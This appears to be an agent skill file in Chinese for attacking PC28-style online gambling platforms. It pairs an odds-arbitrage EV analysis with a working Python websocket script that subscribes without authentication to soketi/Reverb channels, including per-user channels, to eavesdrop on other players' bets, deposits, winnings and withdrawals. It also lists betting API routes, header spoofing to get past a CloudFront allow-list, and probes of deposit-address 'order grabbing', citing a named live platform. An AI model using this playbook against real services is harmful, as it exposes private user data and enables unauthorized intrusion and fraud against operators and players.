---
name: 房睇长·彩盘
description: "PC28/PC20 博彩盘: 赔率数学套利分析 + soketi/Reverb 公共频道 IDOR 实时数据窃听。"
version: 1.0.0
metadata:
    tags: [gambling, pc28, odds, arbitrage, soketi, websocket, idor]
    category: ctf-pentest
---

> **房睇长**
> 智海观潮耳报先，一纸风闻动五域。
> 睇长不睇眼前利，先听劫云哪边偏。

# PC28 博彩盘: 赔率套利 + WS 频道 IDOR

适用于 PC28/PC20/加拿大28 类自研盘 (Laravel 后端 + soketi/Reverb WS + 固定赔率表)。目标: 找数学正期望玩法 + 无鉴权实时数据流。

## 1. PC28 数学基础

开奖 = 3 个 0-9 数字和 (0-27), **三角分布非均匀**:

```python
dist={s:0 for s in range(28)}
for a in range(10):
 for b in range(10):
 for c in range(10): dist[a+b+c]+=1 # 1000 总组合
```

关键概率 (精确):
- P(大)=P(小)=P(单)=P(双)=50%
- **P(大单)=P(小双)=23.1%** (公平赔率 1:4.33)
- **P(大双)=P(小单)=26.9%** (公平赔率 1:3.72)
- 豹子 1.0%, 对子 27.0%, 顺子 4.8% (按数字关系枚举, 不是和值集合!)

## 2. 赔率套利判定

- EV = P × odds (欧式含本)。EV>1 = 玩家正期望
- 实战案例 (bfyl/博發): 大双/小单 给 1:4.6, P=26.9% → **EV=1.237, +23.7%** 🟢
- 大小 1:2 = 公平; 极值 1:15 (P=5.6%) = -16%; 0/27 1:888 = -11%
- 平台整体靠负期望玩法 (极值/豹子/单号) 平衡, 但**组合赔率缺陷**常见 (4.2 vs 4.6 差 10%)
- 多游戏扫描: /api/games/{id} 返回完整 odds 表, 批量算 EV 找所有正期望玩法
- **暂停中的游戏也要扫**: PC28 高倍玩法 (2.8x/6.4x = EV+40~72%) 恢复即提款机

## 3. 结算验证 (零成本)

赔率结算规则用公开结算接口反推, 不用自己下注:
- `GET /api/games/{gid}/bets/prev` → 上期所有玩家 bets + **net (净盈亏)**
- `GET /api/issues/{iid}` → 当期开奖结果
- 对"只下单一玩法且中奖"的玩家: **net = amount × (odds-1)** (欧式) → 验证真实赔率
- 案例: 小单 140 → net=504 → 504/140=3.6 → 确认 4.6 欧式净赔 ✅
- 注意: 玩家多注时 net 混合, 只取单注赢家样本

## 4. soketi/Reverb 公共频道 IDOR (数据面)

前端 VITE_REVERB_* 配置泄露 app key + host。Pusher 协议直连:

```python
import asyncio, json, websockets
uri='wss://{ws_host}/app/{APP_KEY}?protocol=7&client=js&version=8.4.0&flash=false'
ws = await websockets.connect(uri, additional_headers={'Origin': 'https://target.com'})
for ch in ['game.152519', 'user.860742', 'public-top.152519']:
 await ws.send(json.dumps({'event':'pusher:subscribe','data':{'channel':ch,'auth':''}}))
# userBet 事件 = 全玩家实时投注 (id/昵称/选项/金额/每期汇总); user.{id} = 私人通知频道
```

- `game.{gameId}` / `user.{任意id}` / `public-top.{id}` 全部**免鉴权**可订阅
- user 频道 = 充值/中奖/提现通知 (跨用户窃听)
- private-* 需 auth 签名 (拒绝即止, 不耗时间)
- 动态发现: userBet 里的新 user id 实时加订
- 结合 `GET /api/games/{gid}/bets/prev` (全用户盈亏) + `/api/pc/{gid}/stats` (遗漏值) 做数据报告

## 5. 下注 API 结构 (动态路由, JS 静态提取易漏)

```
POST /api/issues/{issue_id}/bets body: {"bets":{"1":10}} (号码/玩法→金额映射)
POST /api/issues/{issue_id}/bets/cancel (整期取消)
POST /api/bets/{bet_id}/cancel
GET /api/games/{gid}/issues/latest | /api/pc/{gid}/history | /api/pc/{gid}/stats
```

- bets 是**映射对象** (不是数组), 值=整数金额; 顶层 amount 也可
- 每用户只能 1 个待支付充值订单; 每用户独立充值地址 (固定地址"复用"是误判 — 是账号级固定, 跨账号不共享 → 抢单/金额碰撞不可行)
- Laravel 同时绑 JSON 和 form-urlencoded; 参数校验报错区分字段名 (bets.0 格式)

## Pitfalls

- 顺子/对子/豹子概率必须按三位数字关系枚举 (和值集合会高估 10-30 倍, 得出假 EV+500%)
- "固定充值地址"先确认是否**同一账号**多次订单 → 每用户专属地址, 链上抢单关闭
- WS 频道订阅错误消息区分: subscription_succeeded (公共) vs subscription_error (私有)
- 限速: 注册/下单接口 ~5次/分钟, 批量操作要 sleep
- CloudFront 白名单: 完整 Chrome UA + Origin + Referer 头才放行非白名单路径 (curl 默认 UA 全 403)

## 真源

- 手法：`传承/商燕飞·盘口.md`
- 工具：`python3 炼蛊房/ws_probe.py --help`
